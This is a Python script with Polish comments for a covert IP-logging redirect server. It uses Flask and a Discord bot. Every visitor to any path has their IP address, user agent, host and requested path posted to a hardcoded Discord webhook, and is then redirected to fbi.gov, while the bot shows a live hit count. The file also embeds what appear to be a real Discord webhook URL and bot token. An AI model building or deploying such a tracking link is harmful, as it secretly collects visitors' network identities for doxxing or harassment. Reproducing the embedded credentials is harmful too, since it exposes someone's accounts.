import threading
import datetime
import requests
from flask import Flask, redirect, request
import discord
from discord.ext import commands
import asyncio

# ===== KONFIGURACJA =====
REDIRECT_URL = 'https://www.fbi.gov/'
WEBHOOK_URL  = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE'
BOT_TOKEN    = 'MTQ3ODQ4MjY1MDA3NDMxNjg4MQ.Gecy9t.Mn6UlZ6buzL6CHnxEApxmRSNPiwYPj8eYZohzg'
PREFIX       = '.'
PORT         = 80
# ========================

# Globalny stan
total_hits = 0
active_message = None
bot_loop = None

# --- KONFIGURACJA BOTA ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# --- FUNKCJA: WEBHOOK LOGOWANIE ---
def send_webhook(ip, user_agent, host, path):
    payload = {
        "embeds": [{
            "title": "🌐 Nowe Wejście (Python)",
            "color": 0x24292e,
            "fields": [
                {"name": "🖥️ IP", "value": f"`{ip}`", "inline": True},
                {"name": "📄 Ścieżka", "value": f"`{path}`", "inline": True},
                {"name": "🔗 Host", "value": f"`{host}`", "inline": True},
                {"name": "🔍 User-Agent", "value": f"`{user_agent[:250]}`", "inline": False}
            ],
            "timestamp": datetime.datetime.utcnow().isoformat()
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

# --- FUNKCJA: AKTUALIZACJA LICZNIKA W BOCIE ---
async def update_stats():
    global active_message
    if not active_message:
        return
    
    embed = discord.Embed(
        title="📊 STATYSTYKI — NA ŻYWO",
        color=0x5865F2,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(name="🔗 Cel", value=f"`{REDIRECT_URL}`", inline=False)
    embed.add_field(name="📈 ŁĄCZNIE WEJŚĆ", value=f"**{total_hits}**", inline=True)
    embed.add_field(name="🟢 Status", value="`Aktywny...`", inline=True)
    embed.set_footer(text="Python Redirect Server")

    try:
        await active_message.edit(content=None, embed=embed)
    except:
        active_message = None

# --- KONFIGURACJA SERWERA (FLASK) ---
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def handle_redirect(path):
    global total_hits
    total_hits += 1
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Brak')
    host = request.headers.get('Host', 'Brak')

    # 1. Update bota (wywołanie async z wątku Flask)
    if bot_loop:
        asyncio.run_coroutine_threadsafe(update_stats(), bot_loop)

    # 2. Webhook
    send_webhook(ip, ua, host, f"/{path}")

    # 3. Chamski redirect
    return redirect(REDIRECT_URL)

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# --- KOMENDY BOTA ---
@bot.event
async def on_ready():
    global bot_loop
    bot_loop = asyncio.get_event_loop()
    print(f'✅ Bot zalogowany jako {bot.user}')

@bot.command(name='start')
async def start_monitor(ctx):
    global total_hits, active_message
    total_hits = 0
    
    embed = discord.Embed(title="🚀 Rozpoczynam monitorowanie...", color=0xFFA500)
    active_message = await ctx.send(embed=embed)
    await ctx.message.delete()
    await update_stats()

@bot.command(name='stop')
async def stop_monitor(ctx):
    global active_message
    if active_message:
        await active_message.edit(content="🛑 Licznik zatrzymany.", embed=None)
        active_message = None
        await ctx.send("Zatrzymano odświeżanie statystyk.")

# --- START WSZYSTKIEGO ---
if __name__ == "__main__":
    print(f"🚀 Odpalam serwer na porcie {PORT} i bota...")
    
    # Odpal serwer w tle
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Odpal bota w głównym wątku
    bot.run(BOT_TOKEN)
